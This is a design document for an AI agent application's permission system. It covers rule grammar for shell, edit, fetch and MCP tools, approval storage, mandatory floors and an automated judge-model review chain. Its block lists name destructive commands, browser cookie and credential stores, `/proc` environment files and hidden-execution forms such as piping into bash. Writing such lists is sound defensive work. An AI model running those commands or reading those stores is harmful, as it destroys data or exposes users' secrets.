# Permissions: always-allow baseline and judge slot

Status: decided 2026-10-14 (issue #28). P1a, the approval rules UI (P1b), the P2 judge call site and scoped file, network and MCP rule enforcement (P1c) are implemented. The out-of-directory depth picker remains a UI integration task.

This page carries the owner-approved direction for issue #28 into the repository. It has two goals:

- **P1:** make "Always allow" usable through structural command rules and scoped saved approvals, while keeping hard floors.
- **P2:** reserve one pluggable judge-model slot for automated review.

The [permission-policy contract](../architecture/permission-policy-design.md)
owns current execution and approval behavior. Implementation gaps against this
design must be reported explicitly.

## Decisions

### P1: rules and "Always allow"

**1. One rules language and one parser** for Settings, the dock and the rule files. Implemented in `src/permissions/rules/rule-specifier.ts`.

| Rule | Matches |
|---|---|
| `Bash(<prefix> *)` | every command whose static argv starts with the prefix tokens, including the bare prefix |
| `Bash(<exact>)` | exactly that static argv |
| `Edit(<path-glob>)` | absolute or project-relative path, using `*`, `**`, and `?`; trailing `/**` also covers the directory itself |
| `WebFetch(domain:<host>[:port])` / `WebFetch(domain:*.<host>[:port])` | exact host, or strict subdomains; omitted port covers all ports |
| `Mcp(<server>)` / `Mcp(<server>:<tool>)` | every tool of a server, or one tool |

- Parsing is strict: anything outside the grammar throws.
- Storage uses one canonical spelling.
- Legacy Store A glob patterns (`web_fetch`, `write_file:path:/abs`) never start with `Name(`. They are classified by shape and keep their glob semantics unchanged.

**2. Shell decision order.** A persistent shell allow rule authorizes execution outside the sandbox. The host evaluates the actual per-invocation execution plan, rather than a remembered approval or a global setting alone:

1. Explicit deny rules deny. The destructive/irreversible and sensitive-path floors require authenticated user consent on every invocation, inside or outside the sandbox; the reviewer cannot approve them. Credential-exfiltration floors have the same behavior.
2. Explicit ask rules ask. A restriction whose command cannot be inspected also asks.
3. A command that will actually run sandboxed is allowed without asking.
4. A command that will run outside the sandbox runs unasked only on an exact `Bash(<command>)` allow rule (user, project or This session); otherwise it asks, in every mode (owner decision 2026-10-25, unsandboxed shell exact-rule requirement). This includes sandbox-off/unavailable execution, excluded commands, an unsandboxed retry and the Windows Plan B. The reviewer and judge are not consulted for it, and headless it is denied and audited.
5. Prefix rules never authorize an unsandboxed command, whether or not a sandbox is active for other commands. This is checked at evaluation time; stored prefixes remain visible and revocable, and still match as deny and ask rules.

Store A action-key rules and remembered dock grants are not `Bash(<command>)` rules, so they no longer authorize a plain-shell invocation; broad tool or glob allows never did. A bash card saves only the host-derived exact rule, at This session, This project or Always (five-choice shell card).

Deny wins over every allow, regardless of specificity or scope. Existing strict-mode and untrusted-origin gates remain before automatic lanes. A session approval never changes the execution plan or switches off the sandbox for later commands. Unsandboxed calls do not consume session or persistent exact-tuple approval memory from Store B: each retry asks afresh unless covered by an exact `Bash(<command>)` allow rule (unsandboxed shell exact-rule requirement).

For shell rule subjects, the permission layer consumes one host-only input, `shellExecution: { runsSandboxed }`. The host invocation authorization pipeline derives this input for native shells from the sealed execution plan; the sandbox producer can supply its per-invocation answer at this single boundary. Whether a sandbox is active for other commands no longer matters (unsandboxed shell exact-rule requirement). Terminal commands carry an explicit plain route. A missing route is also treated as plain, and every shell subject still receives the destructive and sensitive-path floors. The dock never infers sandboxed execution from missing plan evidence. After mandatory human approval floors are satisfied, native fallback execution still requires a one-use, exact-action permit, minted from either authenticated user consent or the completed host policy/reviewer decision.

**3. Bash command-rule matching** runs on the host's shell AST (`src/shared/shell-analysis.ts`, the mvdan/sh grammar). Implemented in `src/permissions/rules/shell-rule-matcher.ts`.
- Every simple command must be covered by some allow rule. Different rules may cover different parts.
- Deny and ask also look inside:
  - `$()`, backticks and process substitution;
  - subshells;
  - loop, conditional and function bodies;
  - assignment values;
  - through wrapper programs (`sudo -u root rm`).
- Unparseable input matches no allow rule.
- Wrappers are never stripped for allow.
- Code-executing runners keep their full argv in rule matching. An applicable
  prefix must include the runner and its proven literal command, such as
  `Bash(npx prettier *)`; an inner-only `Bash(prettier *)` cannot cover it.
  Opaque runner identity or an unknown runner option alone adds no hidden-code
  blocker. The persistent-prefix boundary is checked separately below.

**4. Prefix suggestions and validation.** `BANNED_PREFIX_SUGGESTIONS` in `src/permissions/rules/shell-prefix-values.ts` owns the broad-prefix refusals shared by the dock and the store. Program identities are normalized by basename and interpreter-version suffix before comparison. A banned vector followed only by switches or assignment bindings remains broad, so `node` and `node -e` are refused wildcard prefixes while `node scripts/build.mjs` may be saved. An exact rule can name an otherwise broad program. Empty prefixes remain refused; identified destructive/irreversible commands are refused as both exact and prefix allow rules. Deny and ask rules may still name them.

The default suggestion is an exact rule for the complete static, spellable argv. A wider prefix requires an explicit edit and must pass the same refusal check. Hidden execution, including inline code, script execution, substitutions and evaluation, cannot be covered by an allow rule and produces no persistent suggestion. The host still proves that the candidate covers the whole invocation. There is no read-only program catalog or option-level safety model: search, repository, cluster and runner options do not invalidate a rule merely for loading code, writing files or changing a target. Such a rule is an outside-sandbox permission, not proof of a command's effects. Structural argv matching, explicit restrictions and the floors remain authoritative.

**5. Shell verdict.** The blanket `shell → high` in `resolveUserApprovalVerdict` is no longer the first answer.
- An unreviewed shell ask carries the host's rule-classifier verdict (`ApprovalRequest.ruleVerdict`): read-only is LOW, ordinary is MEDIUM, destructive is HIGH.
- Destructive commands stay once-only.
- With no verdict at all, the fallback is still HIGH (fail closed).

**6. Persistence.**
- "Always allow" for a project writes the per-project rule file in Ave home: `<ave home>/permissions/project-rules/<identity>.json`. Identity, repository discovery, the home boundary, and retained legacy rules follow [Project Rule Scope](../architecture/permission-policy-design.md#project-rule-scope). The file is re-read when it changes on disk. Ave never writes rules into the user's repository.
- "Everywhere" writes the user-global scope, which is Store A (`<ave home>/permissions.json`) extended in place.
- Deny-always uses the same files.
- Stored broad allow wildcards load inert rather than corrupting the file. Settings lists each with a localized reason and Remove action; it never matches. Other rules continue to work, unrelated writes preserve the inert entry unchanged, and a new broad wildcard is refused at save.
- Session approvals, including retained shell entries and eligible browser, terminal and other exact tool approvals, are held in memory under the root conversation: the conversation and every sub-agent spawned from it, at any depth, share it, and separate root conversations never do. A session approval without a conversation is refused (`missing-session`), and the dock disables "Allow for session" for such a request and says why. The root comes from one resolver, `createRootSessionResolver` over the sub-agent runner's recorded origins (live and restored children), which the judge also uses. An app restart clears all session approvals.

**7. Approval storage and retained floors.** Existing Store B entries are never converted to command rules. Non-shell matching remains unchanged; plain-shell execution does not reuse them.
- The shared approval content presents an editable host-derived shell rule suggestion in both the conversation dock and the approval lane card. Project scope is selected initially; Everywhere writes the user file. A saved command rule creates no exact Store B approval.
- For eligible requests, Allow for session records an exact Store B approval under the root conversation id. It does not write a rule file or authorize another root conversation. Plain-shell calls disable this control and ignore retained entries. Existing entries keep their original identities.
- The destructive floor reads each command's argv: recursive or forced deletion in any option order, recursive or world-writable permission changes, raw disk writers and `find -delete` ask on every invocation.
- **Irreversible commands never become allow rules,** exact or wildcard. The dock does not suggest them, the store refuses them, and the host rejects a save with `invalid-rule`. These commands require per-call consent, and deny rules may still name them. The list (`isIrreversibleShellArgv`):
  - Always: `mv`, `cp`, `install`, `tee` (any file operand without `-a`), `truncate`, `unlink`, `dropdb`.
  - `git clean` unless `-n`/`--dry-run`; `git reset --hard/--merge/--keep`; `git restore` unless index-only (`--staged` without `--worktree`); `git stash drop/clear`.
  - `git checkout` with any operand, because `git checkout <name>` restores a file of that name as readily as it switches branch. The exception is `-b <new> [<start>]` without `--` or paths; use `git switch <branch>` for a storable exact rule. `-f`, `-p`, `-B`, `--ours`, `--theirs` and `--` are always refused.
  - `git prune`; `git gc --prune*`; `git tag -d/--delete`; `git remote remove/rm`; `git pull -f/--force`; `git reflog expire/delete`; `git worktree remove -f/--force` and `git worktree prune`; `git update-ref -d/--stdin`; `git fetch -f/--force/-p/--prune/--prune-tags` and `+ref` refspecs.
  - `git switch -f/-C/--discard-changes`; `git branch -d/-D/-M/-C/-f/--delete`; `git push -f/-d/--force/--force-with-lease/--delete/--mirror/--prune`, and `+ref` or `:ref` refspecs.
  - `docker`/`podman`/`nerdctl`/`docker-compose` `prune`/`rm`/`rmi`, and `compose down -v/--volumes/--rmi`.
  - `kubectl delete/drain`, and `kubectl apply/replace --prune/--force`.
  - `gh … delete`, `gh api -X/--method DELETE`; `helm uninstall/delete`; `terraform`/`tofu` `destroy`, `apply -destroy` and `state rm`; `aws` `rm`/`rb`/`delete-*`/`terminate-*`/`remove-*` operations and `--delete`.
  - `rsync --delete*`/`--remove-source-files`; `ln -f`; `redis-cli flushall/flushdb`; `npm`/`pnpm`/`yarn` `unpublish`; `xattr -c/-d`.
  - A dynamic word counts as the worst case.
- `chmod` modes count as world-writable when written as long octal modes (`00777`), when copied from another class (`o=u`, `o=g`), and with `--reference=`. A leading removal such as `-x` or `go-w` is the mode operand, not an option. An unreadable mode is not guessed to be world-writable.
- The sensitive-path floor also covers what a search reads, not only its literal arguments (rounds 5 and 6).
  - A recursive content search whose root is at or above a secret-holding directory is floored: `grep` (`-r`, `-R`, `--recursive`, `-d recurse`, `--directories recurse` or `=recurse`) and `rg`, which always recurses. Secret-holding directories include the home, `/`, `~/.config`, `~/Library/Application Support`, the Ave home and `/proc`.
  - A search that follows symlinks is floored when a followed link resolves into a sensitive path, or when the walk passes 5000 entries without ruling that out:
    - GNU `grep -R` and `grep --dereference-recursive` on every platform;
    - BSD `grep -S` on macOS, where `-R` alone does not follow;
    - `rg -L`/`--follow`;
    - `find -L`/`-follow` for links below the root, and `-H` for root links.
  - `find` without following only lists names, so its roots are not floored, consistent with `ls -R ~`, `du -a ~` and `rg --files`.
  - BSD `find` leading options (`-E -X -d -s -x`, `-f <path>`) are parsed; `-f`'s value is a root.
  - A dynamic root is an ordinary ask.
- Known limits of the floor (accepted, round 6):
  - A recursive search inside a project still reads that project's own `.env`, which matches only the unanchored `**/.env` pattern.
  - A secret committed to the repository is reachable through the `git log -p`, `git show` and `git diff` prefix rules. The floor checks paths, not the content of history.
  - The symlink check is a point-in-time scan. A link created between the decision and the run (TOCTOU) is not seen.
  - The 5000-entry cap means `rg -L` or `find -L` over a large repository (for example one with `node_modules`) always asks.
- The floor also checks git object paths: `<rev>:<path>` and `:<path>` operands (`git show HEAD:.env`, `git cat-file -p HEAD:.env`) and pathspecs after `--` (`git log -p -- .env`) are floored like `cat .env`.
- Secret stores added to `sensitive-paths.ts` (round 5):
  - `/proc/*/environ`, `/proc/*/mem` and `/proc/*/fd/**`, together with their `task/*` and `map_files` forms; `cmdline` and `status` stay readable.
  - Chromium-family `Cookies`, `Login Data`, `Web Data` and `Local State` under `~/Library/Application Support`, `~/.config` and Windows `User Data`, which covers Chrome, Edge, Brave, Arc and Chromium.
  - Firefox `logins.json`, `key4.db` and `cookies.sqlite` under `Firefox/Profiles` and `.mozilla/firefox`.
- `git remote -v`, `git remote show <name>`, `git remote get-url`, `git reflog` and `git worktree list` stay storable. Only `git remote remove/rm/rename/set-url/prune` is refused.
- The dock names the directory a project rule applies to, which is the repository root when one is found, not the execution directory.
- A rule save reports `invalid-rule` for a rule that fails validation or does not cover the command, and `rule-save-failed` when a valid rule cannot be written.
- Settings presents user and project rules together with persistent and session exact approvals in one revocable list. Project enumeration preserves the identity stored in each file, including retained exact-directory scopes. A file whose stored root no longer derives its own name is reported as unavailable, and its rules are still listed and revocable by that stored identity without rewriting the root.
- An edited rule is normalized by one shared function before it is checked: outer and inner whitespace is trimmed and runs of spaces or tabs in a `Bash(...)` body collapse to one space. The dock previews the normalized rule, and the host save path applies the same function; the rule store's parser stays strict for every other writer. The host validates edited rules against the live command and the same refused-prefix policy used by the rule store. A save failure keeps the approval pending. Credential, destructive and other forced one-shot requests cannot acquire remembered allows.
- A corrupt Store A, Store B or project file fails clearly with a visible error.
- Corrupt files are never silently dropped and never overwritten.

**8. Writes.**
- Edit rules apply to every canonical file tool with category `write` and declared path fields, including write, edit, multi-edit, patch, delete, move, copy and archive extraction. Move and copy include both source and destination; extraction includes the archive and destination. Relative globs are anchored to the discovered project root, even when the invocation cwd is a subdirectory. Rules reject `.` and `..` components, duplicate separators and unsupported glob syntax; `**` must occupy a whole path segment. Separators have one canonical spelling. Literal backslashes in POSIX targets or resolved names are refused rather than interpreted as directory separators.
- The matcher consumes the executor's sealed canonical target identities. Every target must be covered by an allow; deny and ask need only one matching target. Sensitive paths and project escapes through symlinks or parent components retain a per-call gate, including for new files and unresolved links.
- An absolute external Edit grant admits only the current invocation's sealed file targets through the existing directory and execution gates. A generic tool allow never grants an external path. No directory scope is propagated to later calls.
- Sensitive paths and Ave's own config, permission and hook files are floors, checked before any allow rule. So are the sandbox's protected control files wherever they appear in a target path, inside or outside the project (`.git`, including hooks and config, `.githooks`, `.husky`, `.vscode`, `.claude` settings, hooks and commands, `.idea/workspace.xml`, `.pre-commit-config.yaml`, `.envrc`, `lefthook.yml` and shell profiles). They are matched with the same case folding as sensitive paths (macOS and Windows fold case). An `Edit(**)` or absolute external allow still asks before writing them, and reads are unaffected. The match covers the whole absolute path, so a project that itself lives under a protected segment (for example `~/.vscode/extensions/<ext>/` or `~/.claude/commands/`) asks before every write; this fails toward asking.
- Symlink escapes ask.

**9. Network.** `WebFetch(domain:...)` rules govern the builtin mediated fetch. Hostnames are case-normalized with a trailing DNS dot removed; a rule port matches the URL's effective port. Only a leading `*.` wildcard is accepted, and it excludes the apex. A wildcard needs at least two labels after `*.`. Public suffixes are not detected, so `*.co.uk` matches every `.co.uk` site. The existing network guard checks each actual redirect destination before transport. A rule-authorized fetch follows destinations covered by an allow. A completed per-call approval also covers ordinary redirects within its initial origin; deny rules and fresh sensitive requests still win. Unapproved ask or uncovered destinations fail with an explicit error. Host allows apply to public fetches; private-network opt-ins retain their existing separate approval identity and policy. Sensitive request screening and SSRF checks remain independent. A screened request (for example, a credential-looking query) is not a floor: a `WebFetch` allow never covers it, and it follows the mode like a fetch without a rule. A redirect that is screened after a rule-authorized or per-call-approved fetch still needs a new decision. Fetches admitted solely by general tool or mode policy retain that policy; destination ask/deny rules and floors still apply at every hop. Rules never inspect shell command text, change plugin domain grants or confine shell egress.

Domain deny and ask rules also feed the browser's existing host-mediated allow-list for navigation and new tabs. A domain allow never skips the browser's own per-site approval. Both paths install the existing origin guard before loading: cross-origin redirects and observed main-frame navigations are refused, and same-origin redirects retain the checked host and effective port.

Domain rules identify URL hostnames, not resolved IP addresses: an IP-literal URL can bypass a rule for its DNS name. IPv6 literals cannot be represented by `WebFetch(domain:...)`. Rules accept only ASCII hostnames, so internationalized names must use punycode; URL parsing uses WHATWG normalization to `xn--` hostnames.

**10. MCP.**
- Always-allow is per tool by default; per server is an explicit option.
- Rules match the server id and original tool name retained by the host adapter. An `Mcp(...)` allow covers only a tool with an explicit non-destructive hint. A destructive annotation, or no such hint, is not a floor: the tool follows the mode and ask/deny rules as before, and only the allow rule does not cover it. Annotations never auto-allow by themselves.

**11. Out-of-directory.** The host resolves file, parent and project-root candidates through `editDepthCandidates`, using existing repository discovery and directory validation. Each candidate is an ordinary Edit rule in the same store; duplicate, sensitive, filesystem-root and wildcard-bearing literal candidates are refused. Connecting these candidates to the dock's depth picker is a separate UI task.

**12. Floors.** These are never always-allowable, in any mode:
- sensitive and secret paths;
- Ave config, permission stores and hooks;
- hardline destructive patterns;
- credential exfiltration;
- privilege escalation;
- plugin and agent capability grants.

### P2: judge slot

**1. One seam.** `PermissionJudge` is the automated-decision interface in
`src/permissions/judge/`. The call site reuses that engine, the existing reviewer
dispatch, canonical DLP redactor, audit writer and `DeferredQueue`.

The `builtin-llm` provider retains the existing `LlmRiskClassifier`,
`max(rule, llm)` verdict, verdict cache, approval provenance and dispatch outcome.
All automated review enters the judge engine, including auto mode, foreground
LOW/MEDIUM review, headless execution and the authoritative shadow baseline.
Absent judge settings or a valid empty configured chain use the default builtin
reviewer chain. Classification and failure behavior remain unchanged, including
eligible host-built-in `meta` calls, except for the unified pause and resume
behavior below.
Automated review requires a conversation or task session identity and a
host-created invocation identity; either missing identity is an explicit
contract error.

**2. Settings and model selection.** The canonical persisted shape is an ordered
`permissions.judge.chain`. The [settings parser](../../src/permissions/judge/judge-settings.ts)
owns all fields, defaults and validation. For example, a local selection stage
followed by the current reviewer model is configured as follows:

```json
{
  "permissions": {
    "judge": {
      "chain": [
        {
          "provider": "external",
          "id": "selection",
          "escalateBelow": 0.8,
          "external": { "command": ["/opt/example/judge"] }
        },
        { "provider": "builtin-llm", "id": "review" }
      ],
      "mode": "shadow",
      "categories": { "shell": true, "write": true, "network": false }
    }
  }
}
```

- A valid empty chain turns the configured chain off; automated review uses the
  default builtin reviewer chain through the same engine.
  The earlier single-stage `provider: "off" |
  "builtin-llm" | "external"` form is accepted on read and serialized as a
  chain on save. Mixing the two forms is invalid.
- A configured chain defaults to `shadow`. Shadow records the chain's result
  without applying it; the builtin reviewer chain remains authoritative.
  Shadow observations create no deferred entries and do not count as blocks.
  The authoritative baseline still participates in the shared breaker once per
  request, including pause and resume.
  In `active`, the chain's result decides eligible calls.
- Settings offers ordered stages, provider/transport, mode, categories and a
  model picker. Its English and Korean text use the same setting semantics.
  Shell and write default on; network defaults off.
- A builtin stage may set `model: "<provider>/<model>"`. The first slash
  separates the provider from the model; model ids may contain further slashes.
  The picker uses configured provider/model options, including the configured
  endpoint's discovered models and saved model selection, as the chat picker
  does. Omitting `model` follows the permission reviewer model.
- `permissions.judge.model` is the permission reviewer model: the model the
  auto-mode reviewer runs on and the default for builtin stages. The user picks
  it in Settings > Permissions with the chat model chooser, from the connected
  API models. `null` is the stored "unset" state, not a missing default: the
  reviewer then runs on the active chat model and follows it, because every
  chat-model change re-wires the reviewer. No fixed default model constant is
  the effective default.
- A selected model must be used exactly. Missing credentials, an unavailable
  provider or a removed model never silently selects a different model. For
  the reviewer model this fails every review as `unavailable` (foreground asks
  with a modal, headless denies) instead of degrading to the rule classifier
  or the chat model, and Settings marks the selection unavailable.
- Stage ids are unique within the chain. `escalateBelow` is an external-stage
  confidence threshold in `[0, 1]`; builtin risk verdicts have no confidence and
  do not accept that field.
- Read issues are visible. A rejected chain retains typed `chainRejected`
  metadata and enters the existing unavailable fallback; it does not become
  explicit off, a partial chain or an implicit builtin provider. In normalized
  `active` mode, it asks with forced approval in the foreground and denies plus
  defers headless. In `shadow`, rejection only records the observation and keeps
  the authoritative auto/headless baseline, without a judge-induced queue entry.
  Warnings for other fields retain their normalizer defaults without blocking an
  otherwise valid chain.
- A fatal settings-file read, JSON parse, root-object or permissions-structure
  failure cannot recover a trustworthy mode. The host carries `settingsUnreadable`
  and conservatively applies the existing unavailable fallback to judgeable
  categories: forced foreground approval or headless deny plus defer, without
  legacy/provider fallback. This changes the effective host failure response,
  not the persisted mode or normalizer defaults. A missing file or block leaves
  the configured chain off and uses the default builtin reviewer chain; a parsed
  rejected shadow chain retains the baseline described above.
- Invalid writes fail before persistence, and saving preserves unrelated
  settings. If runtime refresh fails after a save, the host's write receipt
  restores the original, unnormalized judge subtree, including its absence.
  Compare-and-swap permits rollback only while that subtree still equals the
  value just written; a later manual change is preserved and the conflict is
  reported rather than overwritten. The [settings store](../../src/permissions/permission-settings-store.ts)
  owns the write and rollback contract.

**3. Placement.** Deny and mandatory floors, then explicit ask rules, then allow
rules and saved grants, then the mode matrix, then the judge, then approval.
The call site judges only calls still undecided after those earlier gates and
only in enabled categories. A bare ask from a mandatory gate is not an invitation
to the judge.

No stage overrides a rule, floor, capability grant, remote-controller request or
`strict` mode. A suggested rule is advisory; the judge never persists rules.
The existing trust and approval requirements remain authoritative.

**4. Chain decisions.** Stages run in order. `ask`, a confidence below
`escalateBelow`, or missing confidence when a threshold is configured advances
to the next stage. An `allow` or `deny` meeting the threshold is final; without
a threshold, `allow` and `deny` are final directly. A stage failure advances to
the next stage within the chain deadline. The last stage's ambiguity asks the
user. All stages receive the call context without tool results.
The implicit builtin chain adds no stage or whole-chain timeout beyond the
classifier's existing retry, streaming and transport limits. Explicitly
configured chains retain their configured budgets. Caller cancellation still
propagates in both cases.

**5. Input and output.** The host supplies recent user messages, the normalized
tool call, cwd/project root, effective sandbox state, rule verdict, policy text
and mode. Tool results are excluded. The canonical DLP redactor runs before
external transport and audit. The [shared contract](../../src/permissions/judge/judge-contract.ts)
owns request/verdict types, and the [engine](../../src/permissions/judge/judge-engine.ts)
owns escalation, hook and audit semantics. The [external adapter](../../src/permissions/judge/external-judge.ts)
owns transport framing and output bounds. Malformed output is a failure.

**6. External transport and settings floor.** A command is a non-empty argv array
with an absolute executable path, launched without a shell. A URL is HTTPS or
loopback HTTP and contains no embedded credentials. Exactly one transport is
set. Commands receive a minimal environment allow-list plus validated configured
variable names; runtime secrets are not forwarded. Stderr is bounded, redacted
and audited, never interpreted as a verdict.

The entire `permissions.judge` subtree is user-only. The Settings UI or a manual
user edit may change it; an agent cannot write it through a settings tool,
permission rule, saved grant or judge decision. Existing path protections for
application configuration remain enforced independently.

**7. Lanes and failures.** An active foreground `deny` blocks the invocation;
`ask` requests user approval. A timeout, provider error, malformed verdict or
unavailable final stage never allows and asks with the forced approval surface.
In headless execution, an active non-allow decision denies the current invocation
and appends an item to the existing `DeferredQueue`. A paused breaker routes
interactive requests to the normal user approval card; without an available
user, it denies with a reason naming the threshold. The existing approval card
and notification surfaces explain the pause in English and Korean.
Every allow remains automated for pause checks unless the host has consumed
verified fresh native human consent for that exact action. Policy grants,
remembered approvals, reviewer decisions, parent decisions and sealed rationale
receipts do not establish that provenance.
Only a verified allow answer to the current signed card from a registered
application window's exact main frame can establish fresh consent and resume
the paused breaker. Rules, peers, agents and headless outcomes cannot do so.
The renderer supplies the answer; the host alone mints its provenance and supplies
`remoteControllerOrigin` and parent-adjudication facts. Subframes, webviews,
plugin, `render_html`, MCP-app and other non-app origins or partitions remain
rejected.

The explicit owner registry provides delivery correctness. Every attachment
and lifecycle update goes through `updateApprovalSurface`; readers receive a
resolve-only registry view. Main chat adoption and restore, side-panel load,
tab detachment, work pane and Work Board attachments register their current
surface. Fresh and resumed children register live parent links; scheduled and
background runs register their trusted surface or no surface. The resolver
never infers a missing owner from chat holders, persisted ancestry or focus.
User-driven attachments legitimately transfer registration between app
windows, including a replacement primary adopting a cached conversation, and
existing children follow their parent. A currently unattached window's answer
is rejected and audited without settling the card or creating fresh consent.

App windows are one trust level. A renderer that can perform an allowed attach
can then answer that conversation's card; delivery binding is not isolation
against a compromised app renderer. Defending against that requires a
trusted-chrome approval surface with a main-process-drawn prompt plus native
input proof, which the current design does not provide.
A new request without a registered live surface denies with
`no approval surface` under the headless semantics. Owner closure without a
turn abort leaves an already pending card until the normal five-minute deny
timeout; it never auto-approves. A registered replacement owner can answer
before timeout.
Remembered grants and scope proposals share this
[delivery and registered-frame contract](../architecture/permission-policy-design.md#automated-judge-chain).
One synchronous final gate runs immediately before the tool handler, after all
asynchronous hooks and route admission. It rechecks cancellation, required audit
integrity and writability, breaker state and plugin/remote authority, with no
await before handler entry. A paused invocation returns to the normal forced
one-shot native approval card interactively or denies when no user is available.
After a card or renewed route admission, the same gate runs again. Verified
fresh human consent bypasses only the pause requirement, never the other checks.
Permission-request hooks and signed ask-audit preparation remain bounded and
cancellable. Only the late card's user wait moves outside the tool execution
ceiling and retains the normal five-minute card timeout; actual execution
remains bounded and cancellable.
Caller cancellation remains terminal; internal contract violations and failures
to write the active audit propagate instead of becoming an approval.

For `builtin-llm`, successful LOW allows in both lanes. Foreground MEDIUM allows
only under the existing `autoApprove: "medium"` threshold and without an explicit
approval requirement; HIGH asks. A builtin foreground `ask` advances to any next
stage before requesting approval. Headless MEDIUM/HIGH map to a final `deny`
and defer, without advancing to a later stage. Failed
reviewer outcomes never map their conservative verdict into an allow, including
when `fallbackOnError` is `"rule"`. Existing foreground auto-approval-off behavior
and failure metadata remain unchanged.

**8. Breaker.** One chain-owned breaker counts successful classifier blocks per
root conversation across all automated lanes. A final non-allow verdict counts
once per host invocation identity, including a builtin foreground `ask`.
Scope review, ordinary review and cache assessments of the same invocation
cannot count it again; distinct invocations count separately even with identical
arguments. Intermediate stage verdicts, shadow observations, classifier failures,
timeouts and separate host safety rejections
do not count. The thresholds are fixed at 3 consecutive or 20 total blocks.
The block is counted after the provider and host hook complete, before audit
append. A stop during append does not undo that completed block; a stop before
review completion counts nothing.

An allowed action resets only the consecutive count. The total persists for the
session and resets only when its own threshold triggers a fallback. Reaching
either threshold pauses automation: the triggering request and subsequent
requests require normal manual approval when a user is available, or deny with
the threshold reason when nobody can answer. Authenticated human approval of a
prompted action resumes automation and clears the consecutive count; it does
not otherwise reset the total. Parent-agent, away-authority and remembered
automatic approvals cannot resume it.

Subagents resolve to the same root conversation for breaker and judge audit
identity. Deferred entries retain the actual requesting session so later
approval returns to the correct conversation. Rewiring settings does not create
a fresh counter for that conversation.

**9. Hooks.** `beforeJudge` may redact the judge's input or short-circuit to
ask/deny. It cannot change the executing invocation. `afterJudge` may only keep
or downgrade a decision (`allow → ask → deny`).

**10. Audit and verification.** The existing writer records root session,
invocation identity, tool, argument hash, redacted request, provider id/version,
rationale, latency and fallback. Each executed stage records its verdict,
confidence, model and latency.
Normal builtin review and the authoritative shadow baseline retain the resolved
reviewer model in that stage audit.
Active decisions use the HMAC-protected permission audit; shadow uses the shadow
channel. Active audit failure prevents execution.

Module tests establish chain and adapter semantics. Call-site acceptance also
requires parity through the real foreground and headless dispatch lanes,
trace/cancellation and failure parity, threshold and resume behavior,
deferred/root-session integration, settings write
protection, and changed-flow Settings UI validation. A mocked classifier test
alone does not establish dispatch parity or a live provider's behavior.

### Deviations from the issue text

- The breaker counts per session (3 consecutive / 20 total) rather than per turn (10 of the last 50).
- `rule-only` is collapsed into `provider: off`.

## Delivery

The baseline work used `integration/permissions`. The approval rules UI is delivered through `integration/permissions-2`.

- **P1a** (this change): rules language, parser, shell matcher, refused list, arity suggestion, Store A extension with `ask`, per-project rule files, corrupt-file handling for Store A and B, removal of the blanket shell → HIGH. No UI.
- **P1b:** implemented in the shared approval content and Permissions Settings, with project/user rule persistence, conversation-scoped exact approvals, unified revoke and English/Korean copy.
- **P1c:** path-scoped `Edit`, host-scoped `WebFetch`, `Mcp`, and out-of-directory depth.
- **P2:** reuse `src/permissions/judge/`; land auto-mode relocation with the call site after P1a. The call site owns deferred-queue wiring, root-session mapping, Settings storage/UI with English and Korean text, and the judge-settings write floor.

## Rule implementation

### Where the code is

- `src/permissions/rules/rule-specifier.ts`: the grammar and pure host/MCP identity matchers.
- `src/permissions/rules/scoped-rule-matcher.ts`: edit, network and MCP precedence, mandatory scoped gates and host-resolved depth candidates.
- `src/permissions/rules/shell-prefix-policy.ts`: the suggestion; `shell-prefix-values.ts` holds the refused-prefix list and destructive/irreversible classification.
- `src/permissions/rules/shell-rule-matcher.ts`: the AST walk and deny/ask/allow evaluation.
- `src/permissions/rules/rule-files.ts`: rule validation and `PermissionRulesFileCorruptError`.
- `src/permissions/rules/project-rule-files.ts`: per-project files in Ave home.
- `src/permissions/rules/rule-scopes.ts`: the project-scope cache for the synchronous decision path.

### Decision path

`PermissionManager.checkDetailed` uses two host-built context fields:

- `ruleSubject`: a shell command with its dialect, sealed native edit targets, a mediated fetch URL, or the original MCP server/tool identity;
- `projectRulesCwd`, which the tool pipeline loads through `ensureProjectRulesLoaded` before a synchronous decision. Relative Edit globs use that scope's project root. PowerShell has no project command-rule scope.

Checks run in this order:

1. Deny decides at layer 1.
2. A corrupt Store A, project file or Store B returns a forced ask that names the file for every non-read call. Reads keep the normal matrix so the app stays usable while the file is repaired. Settings identifies unavailable files without overwriting them; the user repairs the file outside the rule list. A corrupt Store B no longer blocks every tool call; the error is logged with the file name.
3. An identified sensitive-path or credential/sink signal decides at layer 2 as
   a forced, never-remembered prompt, before any allow rule or saved approval.
4. Explicit ask rules decide at layer 2 as forced, never-remembered prompts.
   They also win over `allow` mode.
5. Applicable allow rules decide at layer 3 and saved approvals at layer 5.
   Both may satisfy an ordinary shell ask.
6. Without an applicable rule or grant, an ordinary shell reason keeps the
   category/mode path at layer 6 asking. It does not set `forceModal` and remains
   rememberable, subject to existing approval-scope and risk requirements.

The Layer-numbered gates already in place (remote controller, overlay, strict) are unchanged.

### Allow is refused for input the matcher cannot reason about

- parse failure or unsupported syntax (`case`, `select`, `((…))`, coprocesses);
- opaque word expansions (brace expansion, `${x/a/b}`, `$"…"`);
- any substitution;
- command-scoped or assignment-only environment changes (`GIT_DIR=… git status`, `PATH=…; git status`);
- write redirections other than `/dev/null`;
- function definitions;
- a dynamic program name;
- any command the rule classifier grades destructive (the floor).

### Deny and ask cannot see everything

For `Bash(...)` rule matching, they cannot see inside hidden code
(`hiddenCodeReason` in `shell-prefix-policy.ts`). Visibility governs whether a
command rule can inspect execution. Opaque syntax can retain structural rule
blockers without becoming a credential/sink floor:

- a non-runner shell or interpreter given code by any route: `-c`/`-e`, a stdin pipe (`echo … | bash`), a here-string, a here-document, `-s`, `-`, a script file or module (`bash x.sh`, `perl x.pl`, `python -m x`); informational-only `--version`/`--help` forms do not supply code;
- code carriers: `eval`, `source`/`.`, `trap`, `hash -p`, `alias`, `enable -f`, `bind -x`, `mapfile -C`, `complete -C`, `fc`, `at`, `crontab`, `tmux`, editors, string-joining wrappers (`watch`, `flock -c`, `su -c`, `env -S`);
- code-carrying variables (`GIT_SSH_COMMAND=… git fetch`, `PAGER`, `LESSOPEN`, `BASH_ENV`, `PATH`, …);
- unsupported syntax.

A deny rule that matches a visible command decides first. Otherwise, when any deny or ask `Bash(...)` rule exists and the command contains hidden code, the decision is a per-call `forceModal` ask before allow rules and saved grants, even in `allow` mode. An allow rule never covers a command with hidden execution, even without a deny/ask visibility conflict. Program options alone do not invalidate a rule. `find -delete` still reaches the destructive floor.

